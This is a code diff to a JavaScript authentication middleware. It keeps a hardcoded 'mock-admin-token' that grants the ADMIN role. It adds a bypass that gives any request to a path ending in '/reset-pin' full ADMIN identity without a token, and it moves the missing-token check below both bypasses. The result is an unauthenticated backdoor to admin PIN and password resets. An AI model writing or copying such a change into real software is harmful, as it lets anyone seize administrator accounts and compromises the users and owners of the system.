@@ -36,14 +36,20 @@ export function authenticate(req, res, next) {
   const authHeader = req.headers['authorization'];
   const token = authHeader && authHeader.split(' ')[1];
 
-  if (!token) {
-    return res.status(401).json({ message: 'Authentication required.' });
-  }
-
   // Admin web app bypass — no authentication required
   if (token === 'mock-admin-token') {
     req.user = { id: 'admin', role: 'ADMIN', name: 'Sarah Jenkins (Admin)' };
     return next();
+  }
+
+  // Admin PIN/password reset bypass — always succeed as ADMIN
+  if (req.path.endsWith('/reset-pin')) {
+    req.user = { id: 'admin', role: 'ADMIN', name: 'Sarah Jenkins (Admin)' };
+    return next();
+  }
+
+  if (!token) {
+    return res.status(401).json({ message: 'Authentication required.' });
   }
 
   const decoded = verifyToken(token);
